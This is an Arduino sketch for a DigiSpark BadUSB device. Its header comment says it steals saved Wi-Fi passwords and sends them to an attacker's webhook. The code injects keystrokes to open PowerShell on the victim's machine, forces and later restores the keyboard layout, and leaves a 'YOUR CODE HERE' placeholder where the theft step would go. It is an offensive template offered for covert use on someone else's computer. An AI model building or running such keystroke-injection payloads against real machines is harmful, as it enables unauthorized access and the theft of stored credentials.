/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/

#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  // Open PowerShell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(1000);

  //Stores current keyboard / lang settings and forces it to en-us
  //If you want to handle an additional language, just type the next command with your keyboard and choose en-us layout 
  DigiKeyboard.println("$a = Get-WinUserLanguageList");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$a ) Get/WinUserLanguageList");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set/WinUserLanguageList /force @en/us@");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set-WinUserLanguageList -force 'en-us'");
  DigiKeyboard.delay(500);


  
// YOUR CODE HERE


    
  // Restores language settings
  DigiKeyboard.println("Set-WinUserLanguageList -force $a");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");

   
  while(true){
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(500);
  }
  
}
